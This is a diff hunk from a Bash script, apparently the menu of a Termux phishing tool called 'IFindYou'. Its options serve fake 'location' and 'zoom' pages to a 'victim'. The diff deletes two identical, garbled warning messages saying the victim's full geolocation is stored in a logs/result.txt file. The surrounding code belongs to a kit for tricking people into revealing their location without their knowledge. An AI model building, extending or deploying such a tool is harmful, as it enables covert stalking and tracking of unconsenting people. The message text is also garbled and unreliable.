@@ -126,13 +126,11 @@ elif [[ "$selc" == "9" || "$selc" == "nine" || "$selc" == "location" ]]
 then
 site="location"
 rm -rf webs/$site/option.html > /dev/null 2>&1
-echo -e "\033[91mWARNING! If the victim hacked the victim to geolocation, you will\nnot be notified,the entire geolocation of the victimwill be stored\nin the file: /data/data/com.termux/files/home/IFindYou/logs/result.txt"
 start
 elif [[ "$selc" == "10" || "$selc" == "ten" || "$selc" == "zoom" ]]
 then
 site="zoom"
 rm -rf webs/$site/option.html > /dev/null 2>&1
-echo -e "\033[91mWARNING! If the victim hacked the victim to geolocation, you will\nnot be notified,the entire geolocation of the victimwill be stored\nin the file: /data/data/com.termux/files/home/IFindYou/logs/result.txt"
 start
 elif [[ "$selc" == "00" || "$selc" == "exit" || "$selc" == "exit" ]]
 then
